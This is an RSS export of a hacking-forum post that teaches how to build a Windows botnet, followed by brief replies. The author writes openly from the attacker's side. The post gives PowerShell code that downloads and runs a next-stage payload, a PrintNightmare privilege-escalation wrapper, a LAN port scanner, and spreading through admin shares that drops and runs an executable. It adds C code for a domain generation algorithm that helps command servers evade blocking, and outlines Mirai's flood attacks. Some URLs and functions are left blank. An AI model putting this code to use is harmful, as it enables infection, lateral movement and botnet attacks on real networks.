<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware Development: Botnet-Based</title>
    <link>https://0x00sec.org/t/malware-development-botnet-based/36818</link>
    <description>Here&#39;s @0xf00, I no longer have access to this account, in a moment of genius, I managed to wipe my one and only backup, However I&#39;ll be sharing articles both here and on github at 0xf00I.github.io.

In this article, I will discuss the fundamentals of botnets dev, providing insights into their structure and operation. After stumbling upon a post titled &quot;How does one create an IOT botnet?&quot;, I thought about writing an article covering the fundamentals of botnet project I wrote a long time ago and how vulnerabilities are exploited by worms to propagate through networks. So, let&#39;s start with a simple definition:

**What is a Botnet?** In simple terms, a botnet is a network of computers infected by malware and controlled by a single entity or party.

Botnets usually operate through three stages or more. In this article, I&#39;ll go over each stage, explaining how they work, and provide code example. Finally, a detailed explanation, Let&#39;s get started with our exploration of botnets and their inner workings.

# Entry Point 
The primary approach involves utilizing spam campaigns, This method is preferred due to its simplicity making it challenging to trace the origin of the initial infection or its source. The attack is mass rather then targeted, So, Typically you get an e-mails contain a malicious attachment that is often referred to as an invoice, and that&#39;s usually the stage 1 of every infection &quot;The malicious macro&quot; a social engineering attempt to lure an unsuspecting victim into executing the payload of the document, In this article we gone wear the black hat and play the role.


```asm
        Initial Access         Execution              Persistence
             |                      |                      |
             V                      V                      V
[PrintNightmare Exploit] ---&gt; [Malware Injection] ---&gt; [Maintain Control]   

    Command and Control     Actions on Objectives
             |                      |
             V                      V
    [Phone Home to C&amp;C] ---&gt; [Initiate The Attack]   
					                                   Figure 1
```

In Figure 1, The malware operates multi-stage components that inject later stages into separate processes, First exploit a vulnerability for the sake of this article I&#39;m gone deploy an old vulnerability Known as &quot;Print Spooler Vulnerability&quot; or &quot;PrintNightmare&quot;  to infect vulnerable devices and spread the malware within the network, Next deployed our botnet and finally phone C&amp;C to activated and attack is initiated. The main goal is to establishes a connection to a target server, receives instructions, and then launches the DDoS attack using multiple threads.

The multi-stage approach has advantages despite the fact that creating complex, only one-phase could seem to be the best way of achieving our objective. By structuring the stages, I can reduce the impact if one fails or is detected too early. Because of its modular design, the operation stays simple and hidden even if one component is compromised, Given each stage will automatically activate self deletion if succeeds. Moreover, a multi-stage design allows us to modify and enhance the attack plan, creating a balance between complexity and simplicity enables us to obfuscate the command and control channel to make detection more difficult.

## Stage 1 - The dropped Powershell script
During this phase, we assume that the target has fallen for our social engineering tactic and activated the embedded macro within the document. Upon opening the file, the contained code is executed, leading to the deployment of a PowerShell script.

``` 
$urlArray = \&quot;&quot;.split(\&quot;,\&quot;);
$randomNumber = $randomGenerator.next(1, 65536);
$downloadedFile = \&quot;c:\windows\temp\&quot;;
foreach($url in $urlArray){
	try{
		$webClient.downloadfile($url.ToString(), $downloadedFile);
		start-process $downloadedFile;
		break;
	}catch{}
}
```

The script systematically cycles through a predefined list of domain names, attempting to retrieve the subsequent stage. Specifically, it targets the directory _C:\windows\temp/_. If the download is successful, the acquired file is executed. Should an error arise, the process continues with the next URL, as the `catch` clause is left empty. In a real-world scenario, Obfuscation would be taken to an advanced level.

## Stage 2 - Payload Delivery and Privilege Escalation
When this phase is triggered, the next stage involves checking a set of conditions before proceeding to download the malware, These conditions help ensure controlled execution &quot;I do not want shoot myself&quot;

Next, essential host information is gathered from the system, and a check for administrative privileges is conducted. If the current user lacks such privileges, the script will relaunch with elevated permissions. The ultimate objective is to determine if the current user has administrative access; if not, an attempt to escalate privileges ensues by leveraging the `PrintNightmare` vulnerability.

in this example.we&#39;re utilizing `CVE-2021-34527`, known as `PrintNightmare`, for a Local Privilege Escalation (LPE) scenario using a purely PowerShell-based approach. The provided PowerShell script executes the PrintNightmare attack technique, aiming to elevate local privileges on the system.

This function is designed to automate the exploitation of the `CVE-2021-34527`, commercing by loading and executing a PowerShell script containing the exploit code you can find on [github](https://github.com/JohnHammond/CVE-2021-34527/blob/master/CVE-2021-34527.ps1), and it checks for successful privilege escalation  

In simple term&#39;s the (poc)exploit objective is to escalate privileges by leveraging the PrintNightmare vulnerability. It first generates a payload DLL, constructs custom structures, and then attempts to load the payload as a printer driver.

Let&#39;s break down some key functionalities (PoC): 

The heart of the exploit is encapsulated within the `Invoke-Nightmare` function. This function is responsible for creating and executing the exploit payload.

**2. Parameters:**

The `Invoke-Nightmare` function accepts the following parameters:

- `$DriverName`: A string parameter, which may be set to a benign name.
- `$NewUser`: A string parameter, representing the new username for privilege escalation.
- `$NewPassword`: A string parameter, representing the new password for privilege escalation.
- `$DLL`: A string parameter, which can be used to provide a custom payload DLL (Dynamic Link Library) or left empty to generate a payload.

**3. DLL Generation and Customization:**

- If `$DLL` is not provided (empty), the PoC generates a malicious DLL payload by:
    - Obtaining the payload data as a base64-encoded string using the `get_nightmare_dll` function.
    - Converting the base64 string to byte data.
    - Encoding the new username and password into the payload, if provided.
    - Saving the payload as a temporary DLL file (`nightmare.dll`) in the system&#39;s temporary directory.

We store the payload as a string. It decodes a base64-encoded string into a PowerShell script, presumably containing the code to exploit CVE-2021-34527 (PrintNightmare).

**Checking for Admin Privileges:**
The function begins by checking if the current user has administrator privileges using a custom function or cmdlet called `Test-Admin`. If the user already has admin privileges, the exploit is not executed, as there is no need for further escalation.

```
function PrivEsc {
    if (-not (Test-Admin)) {
        $NightmareCVE = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PrintNightmare))
        $d_path = &quot;c:/users/$env:USERNAME/appdata/local/temp/$(Get-RandomString (Get-Random -Minimum 5 -Maximum 12))&quot;
        Set-Content -Path &quot;$d_path.ps1&quot; -Value $NightmareCVE
        $try_nightmare = Invoke-Expression -Command &quot;Import-Module $d_path.ps1; Invoke-Nightmare -NewUser &#39;$env:USERNAME&#39; -NewPassword &#39;0xph001234!!&#39;&quot;
        if (Test-Admin) {
            Write-Host &quot;got admin!&quot;
            return $true
        }
        $check_imp = Invoke-Expression -Command &#39;whoami /priv&#39; | ForEach-Object { $_.ToLower() }
        foreach ($line in $check_imp) {
            if ($line -match &#39;seimpersonateprivilege&#39; -and $line -match &#39;enabled&#39;) {
            }
        }
    }
    return $false
}
```

**Executing the Exploit:**
Next, Creates a new PowerShell script file in the random directory path (`&quot;$d_path.ps1&quot;`) and writes the decoded exploit code (`$NightmareCVE`) into the file,  attempts to execute the PowerShell script using `Invoke-Expression`. It imports the module (`Import-Module $d_path.ps1`) and passes parameters to the `Invoke-Nightmare` function, including a new username and password. (`$env:USERNAME`) and a new password (`&#39;0xph001234!!&#39;`).

After executing the exploit, the script checks again for admin privileges using `Test-Admin`. If the user now has admin privileges, it writes &quot;got admin!&quot; to the console and returns `true`, indicating a successful privilege escalation, and finally we execute `whoami /priv` to check for a successful **Exploitation**  or if the malware is unable to, or if they already have admin privileges before running the code. 

## Stage 3 - Network Enumeration and Propagation

In this phase, we conduct network enumeration, identify vulnerable ports, and exploit open ports for potential propagation. This phase involves:

pivotal in identifying local network addresses, particularly those associated with common private IP ranges. By excluding the &#39;lo&#39; interface, which pertains to the local loopback, this function establishes a basis for subsequent actions involving local network enumeration.

Fundamentally, This process of pinpointing these local addresses is what furnishes us with the indispensable intelligence we require.

```
function Get-LAN {
    $interfaces = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
    $localIP = @()

    foreach ($interface in $interfaces) {
        if ($interface.Name -eq &#39;lo&#39;) {
            continue
        }
        
        $iface = $interface.GetIPProperties().UnicastAddresses | Where-Object { $_.Address.AddressFamily -eq &#39;InterNetwork&#39; }
        if ($iface -ne $null) {
            foreach ($j in $iface) {
                $addr = $j.Address.IPAddressToString
                if ($addr -match &#39;^192\.168|^172\.16&#39;) {
                    $localIP += $addr
                }
            }
        }
    }
    return $localIP
}

```

1. Utilizing the `System.Net.NetworkInformation.NetworkInterface` class, it retrieves a list of network interfaces present on the local system.
    
2. It filters out the &#39;lo&#39; interface (loopback), which is typically used for local testing and doesn&#39;t provide relevant network information.
    
3. For each network interface, it extracts the IPv4 addresses that belong to common private IP ranges (e.g., 192.168.x.x, 172.16.x.x).
    
4. These identified local IP addresses are collected and stored in the `$localIP` array, which forms the foundation for subsequent actions related to local network enumeration.

Next,  our objective to pinpoint vulnerable ports within the local network. first leverages the IP addresses obtained from the `Get-LAN` function and iterates through a list of ports that are commonly exploited by attackers. 

```
function Get-VulnPorts {
    $vulnPorts = @(&#39;445&#39;, &#39;3389&#39;, &#39;5985&#39;)
    $vuln = @{}
    $localIP = Get-LAN

    foreach ($addr in $localIP) {
        $ipParts = $addr -split &#39;\.&#39;
        $range = [ipaddress]::Parse(&quot;$($ipParts[0]).$($ipParts[1]).1.0/24&quot;)

        foreach ($ip in $range.AddressList) {
            foreach ($port in $vulnPorts) {
                $client = New-Object System.Net.Sockets.TcpClient
                $result = $client.BeginConnect($ip, $port, $null, $null)
                $wait = $result.AsyncWaitHandle.WaitOne(100, $false)
                if ($wait -and !$client.Connected) {
                    if ($vuln.ContainsKey($ip.ToString())) {
                        $vuln[$ip.ToString()] += &quot;,$port&quot;
                    } else {
                        $vuln[$ip.ToString()] = $port
                    }
                }
                $client.Close()
            }
        }
    }
    return $vuln
}
```

For each IP address and port combination, the function tests the ability to establish a connection. Failed connections prompt recording of the IP and port in the `$vuln` hash table, indicating potential security weaknesses.

1. It maintains a predefined list of commonly exploited vulnerable ports, including 445 (SMB), 3389 (RDP), and 5985 (WinRM).
    
2. For each local IP address, the function iterates through the list of vulnerable ports and attempts to establish a connection using `System.Net.Sockets.TcpClient`.
    
3. If a connection attempt fails (indicating an open port), the function records both the IP address and the port number in the `$vuln` hash table. This hash table provides a comprehensive list of potential security weaknesses within the local network.

This one is self explanatory we builds on insights from the `Get-VulnPorts` function.and focuses on exploiting open ports. Specifically, if a vulnerable port corresponds to SMB (port 445).

```
function Abuse-OpenPorts {
    $smb = &#39;445&#39;
    $mstsc = &#39;3389&#39;
    $ports = Get-VulnPorts

    foreach ($ip in $ports.Keys) {
        $openPorts = $ports[$ip] -split &#39;,&#39;

        foreach ($port in $openPorts) {
            if ($port -eq $smb) {
                Drop-OnShare $ip
            } elseif ($port -eq $mstsc) {
                MSTSC-Nightmare $ip
            }
        }
    }
}
```

1. Checking whether the vulnerable ports identified in the previous step correspond to specific services, such as SMB (port 445) or RDP (port 3389).
    
2. Depending on the service associated with an open port, the function invokes corresponding functions, such as `Drop-OnShare` or `MSTSC-Nightmare`, to escalate the potential vulnerability.
    
3. For open ports that match SMB (port 445), the `Drop-OnShare` function is called to exploit shared network resources on remote systems.
    
4. For open ports corresponding to RDP (port 3389), the function invokes the `MSTSC-Nightmare` function to further exploit the potential vulnerability.

If pass the function invokes `Drop-OnShare` to execute actions targeting shared resources. Similarly, if the vulnerable port matches RDP (port 3389), `MSTSC-Nightmare` is invoked to further exploit the situation. 


and finally leveraging information gathered to exploit shared network resources on remote systems. Its core functionalities include payload delivery and lateral movement:

```
function Drop-OnShare($ip) {
    $payload = @&quot;
    (New-Object Net.WebClient).DownloadFile(&#39;&#39;, &#39;C:\phoo.exe&#39;)
    Start-Process &#39;C:\&#39;
&quot;@
    
    $defaultShares = @(&#39;C$&#39;, &#39;D$&#39;, &#39;ADMIN$&#39;)
    $availableDrive = Get-PSDrive -Name &#39;Z&#39; -ErrorAction SilentlyContinue

    if ($availableDrive -eq $null) {
        $availableDrive = Get-PSDrive -Name (&#39;A&#39;..&#39;Z&#39; | Where-Object { Test-Path $_: -PathType Container } | Select-Object -First 1)
    }

    foreach ($share in $defaultShares) {
        try {
            $sharePath = &quot;\\$ip\$share&quot;
            if (Test-Path -Path $sharePath) {
                $null = Invoke-Expression -Command &quot;net use $($availableDrive.Name): $sharePath /user:username password 2&gt;&amp;1&quot;
                if (Test-Path -Path &quot;$($availableDrive.Name):&quot;) {
                    $payloadPath = &quot;$($availableDrive.Name):\aaaa.ps1&quot;
                    $payload | Set-Content -Path $payloadPath
                    $null = Invoke-Expression -Command &quot;powershell -ExecutionPolicy Bypass -File $payloadPath&quot;
                    Remove-Item -Path $payloadPath
                    $null = Invoke-Expression -Command &quot;net use $($availableDrive.Name): /delete /yes&quot;
                }
            }
        }
        catch {}
    }
}
```

The primary purpose of the `Drop-OnShare($ip)` function is to utilize the inherent vulnerabilities of shared network resources to distribute and execute malicious payloads on remote systems. By taking advantage of administrative shares, the function aims to achieve the following goals:

1. **Payload Delivery:** The function utilizes an embedded PowerShell payload within the script to download a malware file (`phoo.exe`) and initiate its execution on the target system.
    
2. **Lateral Movement:** By taking advantage of administrative shares (`C$`, `D$`, `ADMIN$`), the function facilitates lateral movement within the network. It maps these shares to drive letters.

For each default administrative share (`C$`, `D$`, `ADMIN$`), it attempts to map the share to the available drive using the `net use` command with supplied credentials (username and password), If the share mapping is successful, the payload is written to a file on the remote system, executed, and then removed.
## Stage 4 – The binary
Once the conditions are met and the execution proceeds as planned, the user&#39;s device becomes part of our botnet. The next step involves our bot binary identifying and connecting to a Command and Control (C&amp;C) server for exchanging messages. This connection may be established using either a hardcoded IP address or domain name.

Next, We develop an algorithm that generates predictable domain names associated with the C&amp;C server. This algorithm&#39;s specifics are known only to the C&amp;C server operators, making it difficult to extract or block communication based on domain names.
### Domain Generation Algorithms (DGAs):
For this part the DGA used generated domain names based on various parameters, including the current date and time. 
#### Features
1. Daily Domain Generation: The DGA can generate up to 50 different domain names per day. This high degree of variability ensures that the C&amp;C server can rapidly adapt to changing circumstances, making it challenging for security analysts to predict and block communication.

2. Multiple Domain Testing: To further confound detection efforts, the malware will test up to 20 different domains in succession. Each domain is tested only once, reducing the risk of patterns emerging in communication behavior.

3. Delay Mechanism: There is a built-in 5s wait time between attempts to connect to new domains. This delay helps the botnet avoid triggering suspicion by flooding network traffic with connection attempts.

The domain generation routine first generates a seed which depends on the sequence number and system time. The seed is built using cryptographic hashes. The hashing algorithm is SHA256, The seed is generated as follows:

```
    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year, month, and day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, &quot;%02x&quot;, sha256_result[i]);
    }

```

The core function generates a complete domain name:
* It selects a random suffix from a predefined list.
*  Calculates the SHA-256 hash,  year, month, and day.
*   Converts the SHA-256 hash to a hexadecimal string.
*  Generates additional domain parts based on the hex values from the hash.
* Appends the selected suffix to complete the domain name.

Entry point:
*  Seeds the random number generator with the current time.
* Enters a loop to generate 50 domain names, each unique due to the random sequence number and date.
* For each iteration, it generates a random sequence number, retrieves the current date, calls create_domain to generate a domain name, and tested it. It then waits for 5 seconds before the next iteration.

#### Top Level Domain : 
     
The code defines an array called suffixes that contains a list of possible top-level domain (TLD) suffixes. These suffixes represent the highest level of the domain hierarchy (e.g., &quot;.xyz,&quot; &quot;.cool,&quot; &quot;.ninja&quot;).

```

const char *suffixes[] = {&quot;.xyz&quot;, &quot;.cool&quot;, &quot;.ninja&quot;};
```

To create domain names with different TLDs, the code randomly selects one of the suffixes from the suffixes array. This random selection introduces variability into the generated domain names.

```
int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
```

After generating the domain name parts (based on the sequence number, date-based elements, the selected suffix is appended to the domain name.

```
strcat(domain_parts, suffixes[suffix_index]);
```

Suppose suffixes contains three TLD suffixes: &quot;.xyz,&quot; &quot;.cool,&quot; and &quot;.ninja.&quot;

During the execution of the create_domain function, a random number between 0 and 2 is generated to select one of these suffixes.

For instance, if suffix_index is 1 (indicating &quot;.cool&quot;), the generated domain name will include &quot;.cool&quot; as the top-level domain. The rest of the domain name is constructed based on the sequence number, date, and additional parts.

#### C Code of the DGA
```

// Function to generate a cryptographically secure random number
uint32_t generate_random_sequence() {
    uint32_t seq_nr;
    if (RAND_bytes((unsigned char *)&amp;seq_nr, sizeof(seq_nr)) != 1) {
        // Handle random number generation failure
        fprintf(stderr, &quot;Error generating random sequence number.\n&quot;);
        exit(1);
    }
    return seq_nr;
}

// Function to convert a hex string to an integer
uint32_t hex_to_int(const char *hex) {
    uint32_t result = 0;
    for (int i = 0; hex[i] != &#39;\0&#39;; i++) {
        result &lt;&lt;= 4;
        if (hex[i] &gt;= &#39;0&#39; &amp;&amp; hex[i] &lt;= &#39;9&#39;) {
            result += hex[i] - &#39;0&#39;;
        } else if (hex[i] &gt;= &#39;a&#39; &amp;&amp; hex[i] &lt;= &#39;f&#39;) {
            result += hex[i] - &#39;a&#39; + 10;
        }
    }
    return result;
}

// Function to generate a domain part
void generate_domain_part(uint32_t seed, int nr, char *part) {
    int i = 0;
    while (nr &gt; 1) {
        uint32_t edx = seed % 36;
        seed /= 36;
        char char_value;
        if (edx &gt; 9) {
            char_value = &#39;a&#39; + (char)(edx - 10);
        } else {
            char_value = &#39;0&#39; + (char)edx;
        }
        part[i++] = char_value;
        if (seed == 0) {
            break;
        }
        nr--;
    }
    part[i] = &#39;\0&#39;;
    // Reverse the part in place
    int len = strlen(part);
    for (int j = 0; j &lt; len / 2; j++) {
        char temp = part[j];
        part[j] = part[len - j - 1];
        part[len - j - 1] = temp;
    }
}
```


In summary, the code constructs domain names by combining multiple elements, including a random TLD suffix, a SHA-256 hash of the sequence number and date, and additional domain parts generated from the hash. This approach aims to create unique and unpredictable domain names.

```
// Function to create a domain
void create_domain(uint32_t seq_nr, struct tm *date, char *domain) {
    // Define an array of possible suffixes
    const char *suffixes[] = {&quot;.xyz&quot;, &quot;.cool&quot;, &quot;.ninja&quot;};

    // Calculate a random index to select a suffix
    int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));

    // Calculate the total length of domain_parts
    size_t total_length = SHA256_DIGEST_LENGTH * 2 + strlen(suffixes[suffix_index]) + 1;

    // Dynamically allocate memory for domain_parts
    char *domain_parts = (char *)malloc(total_length);

    // Ensure successful allocation
    if (domain_parts == NULL) {
        fprintf(stderr, &quot;Memory allocation failed.\n&quot;);
        exit(1);
    }

    // Initialize domain_parts as an empty string
    domain_parts[0] = &#39;\0&#39;;

    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));

    // Update SHA-256 hash with month
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));

    // Update SHA-256 hash with day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, &quot;%02x&quot;, sha256_result[i]);
    }

    // Generate domain parts
    for (int i = SHA256_DIGEST_LENGTH * 2; i &lt; total_length - strlen(suffixes[suffix_index]); i += 8) {
        uint32_t seed = hex_to_int(domain_parts + i);
        char part[9];
        generate_domain_part(seed, 8, part);
        strcat(domain_parts, part);
    }

    // Append the selected suffix to the domain_parts
    strcat(domain_parts, suffixes[suffix_index]);

    // Copy the generated domain to the output parameter
    strcpy(domain, domain_parts);

    // Free the dynamically allocated memory
    free(domain_parts);
}

int main() {
    // Seed the random number generator
    srand(time(NULL));

    for (int i = 0; i &lt; 50; i++) {
        uint32_t seq_nr = generate_random_sequence();  // Generate a random sequence number
        time_t rawtime;
        struct tm *date;

        time(&amp;rawtime);
        date = localtime(&amp;rawtime);

        char domain[160]; // Increased buffer size to accommodate the longer SHA-256 hash
        create_domain(seq_nr, date, domain);

        //  !!! (replace this )
        // Code here !!! 

        printf(&quot;Testing domain: %s\n&quot;, domain);

        // Wait for 5 seconds
        sleep(5);
    }

    return 0;
}
```

* Domain Resolution:

    When a bot needs to establish communication with the C&amp;C server, it calculates the current domain name using the DGA algorithm.
    The algorithm generates a domain name that the bot will attempt to resolve into an IP address.

* C&amp;C Server Setup:

    The botnet configure a large number of domain names corresponding to possible future C&amp;C servers, These domain names are registered in advance.

* Dynamic Resolution Attempt:

    When the bot attempts to connect to the C&amp;C server, it tries to resolve the generated domain name into an IP address.
    The domain name may not exist initially, but at some point in the future, the author will register one of the pre-generated domain names, associating it with the IP address of the actual C&amp;C server.

## Final Stage  - Phone Home 

Generating domain names is just one aspect of communication with a C&amp;C server. To establish communication with a C&amp;C server, typically needs additional functionality, such as:

* Network Communication: The code needs to communicate over the network, typically using protocols like HTTP, HTTPS, or custom protocols. This would involve creating sockets, sending requests to the C&amp;C server, and receiving responses, Next, Command Parsing and Data Encryption/Decryption C&amp;C communications are encrypted to hide the actual content from network monitoring, Persistence and finally, Data Exfiltration.

* Our botnet should:

    Include a master node that controls all other nodes on the network, Deploy disguised malware/slave nodes on host computers transmit commands from the master node to the slave node, execute, and return an output back to us

1. **Initiation:**

```
int channel = //initiate a channel given SERVER, PORT, and name;
```

Next, Let&#39;s define the actual connection between master and slave! To do this, define a network socket through which data can be sent. Think of master as having many &#39;electrical sockets&#39;. Now, we need to build a &#39;plug&#39; on slave that fits master&#39;s &#39;wall sockets&#39;. We can do this using the socket library&#39;s ``socket()`` function. How convenient! ``socket()`` takes in 3 arguements: communications domain, socket type, and a protocol. For communication&#39;s domain, you probably already guessed it: ``AF_INET.`` For socket type, we want our socket to be one that simply streams data both directions. Hence, use the given macro ``SOCK_STREAM`` Let&#39;s not worry about the socket protocol. 

```
int init_channel (char *ip, int port, char *name) {
	char msg[CMD_LENGTH];
	struct sockaddr_in server;

	server.sin_addr.s_addr = //convert the ip to network byte order
	server.sin_family = //set the server&#39;s communications domain
  server.sin_port = //convert port to network byte order
  
  int channel = //define a SOCK_STREAM socket
  
  if(channel &lt; 0) {
    perror (&quot;socket:&quot;);
    exit(1);
  }
  
  int connection_status = //use the defined channel to connect the slave to the master server
  
  if (connection_status &lt; 0) {
    perror (&quot;connect:&quot;);
    exit(1);
  }

  respond (channel, msg);
  return channel;
}
```

This is a fairly fundamental network. The function returns an int representing the socket. Store this value in channel. Next, we want to jump start our socket (plugging slave into master&#39;s wall ``socket()``. Call the C function ``connect()``. This takes in three arguments: the channel, the `sockaddr struct`, and the size of the struct in bytes. If connect() returns a positive integer, your connection with master was successful! In order to test our newfound connection, let&#39;s send a greeting to master! Populate our message buffer and use ``respond()`` to send msg through channel back to master. Finally, we want the ``init_channel()`` function to return this successful connection.


2. **Listening for messages:**

Once the slave is connected to the master, it needs to constantly be listening for messages and act immediately upon a command. So, let&#39;s use an infinite while loop to receive and parse these messages, below the `printf` statement, add an infinite while loop that calls two functions: ``recieve()`` and ``parse()`` in that order. Both functions take the channel and msg stack buffer as arguments. This should look something like:

```
Infinite Loop {
  recieve(...);
  parse(...);
}
```

Also It&#39;s important to note that having a large number of bots attempting to connect to a single C&amp;C server simultaneously can inadvertently launch a Distributed Denial of Service (DDoS) attack against the server. To address this, we adopt a hierarchical structure where groups of bots, typically in batches of a fixed number like 50, report to intermediary nodes. These nodes can be part of the botnet and may further relay requests and responses to other nodes before reaching the main C&amp;C server. This division of labor helps distribute the load and reduces the risk of DDoS attacks on the primary C&amp;C server.

# Final Notes and  Analysis

Our botnet is still pretty uninteresting; I avoided the most interesting part for obvious reasons: this is not true malware; it only has to teach you the basics. A botnet is an interesting piece of code and requires a skilled coder, not necessarily an experienced one. Understanding networking protocols, including TCP/IP, DNS, and HTTP, Also, some exploit development is initiated through the exploitation of vulnerabilities. Setting up and maintaining C&amp;C servers to issue commands to botnet nodes is one of the most important things to consider because it has many aspects. One of them is maintaining the OpSec of the botnet infrastructure and its operators. Implementing encryption and cryptographic techniques Planning for infections, spreading, and having a killswitch if things go sideways, which they always do,

Let&#39;s take, for example, the Mirai malware, for which I explained a code snippet of the leaked source code in the original post. Mirai is one of the successfully operated With over a quarter billion CCTV cameras around the world alone, as well as the continued growth of other IoT devices infected. So let&#39;s revisit some of the functionalities. The malware performs wide-ranging scans of IP addresses to locate under-secured IoT devices that could be remotely accessed via easily guessable login credentials.

https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123

One of Mirai&#39;s key features is its ability to launch HTTP floods and various network-layer (OSI layer 3-4) DDoS attacks. It can execute GRE IP and GRE ETH floods, SYN and ACK floods, STOMP floods, DNS floods, and UDP flood attacks.

Interestingly, Mirai includes a hardcoded list of IPs that its bots are programmed to avoid during scans. This list, which you can find below, includes the US Postal Service, the Department of Defense, the Internet Assigned Numbers Authority (IANA) and IP ranges belonging to Hewlett-Packard and General Electric.

https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674

I find this rather intriguing because one of the principles I always aimed to follow in software development, including malware, is to avoid hardcoding simple code. Yet, it&#39;s fascinating that Mirai, despite its simplistic approach, was eventually used in one of the most prominent cyberattacks to date, Mirai even searches for and eliminates the competing IoT malware known as &quot;Anime.&quot; It does this by identifying the malware&#39;s presence through its executable path and then terminating and removing it from the compromised device.

https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187

The goal of this is obvious Mirai maximize the attack potential of the botnet devices, &quot;Rise Up And Kill Him First&quot;, These offensive and defensive measures are common among malware authors. 

In conclusion, these were some of the intriguing aspects I found within this source code. They underscore the delicate balance between the complexity and simplicity of malware development; achieving success in infiltrating advanced systems often doesn&#39;t require advanced and sophisticated malware. Instead, it frequently comes down to human error and the art of social engineering. To this day, social engineering remains one of the most effective techniques for spreading malware or executing offensive operations.</description>
    
    <lastBuildDate>Tue, 10 Oct 2023 09:29:22 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-development-botnet-based/36818.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware Development: Botnet-Based</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-botnet-based/36818/6</link>
        <pubDate>Sat, 06 Jan 2024 00:08:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-36818-6</guid>
        <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
      </item>
      <item>
        <title>Malware Development: Botnet-Based</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <p>Thank you, I Appreciate It.</p>
          <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-botnet-based/36818/4</link>
        <pubDate>Thu, 07 Sep 2023 21:40:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-36818-4</guid>
        <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
      </item>
      <item>
        <title>Malware Development: Botnet-Based</title>
        <dc:creator><![CDATA[crimsonRain]]></dc:creator>
        <description><![CDATA[
            <p>Great to see you again! Once again, thank you for sharing your wisdom</p>
          <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-botnet-based/36818/3</link>
        <pubDate>Thu, 07 Sep 2023 01:04:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-36818-3</guid>
        <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
      </item>
      <item>
        <title>Malware Development: Botnet-Based</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p>Please PM me or any of the site admins, we will be happy to restore your account. (after asking you a few question of course <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=12" title=":grinning:" class="emoji" alt=":grinning:" loading="lazy" width="20" height="20"> )</p>
          <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-botnet-based/36818/2</link>
        <pubDate>Wed, 06 Sep 2023 16:28:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-36818-2</guid>
        <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
      </item>
      <item>
        <title>Malware Development: Botnet-Based</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <p>Here’s <a class="mention" href="https://0x00sec.org/u/0xf00">@0xf00</a>, I no longer have access to this account, in a moment of genius, I managed to wipe my one and only backup, However I’ll be sharing articles both here and on github at <a href="http://0xf00I.github.io" rel="noopener nofollow ugc">0xf00I.github.io</a>.</p>
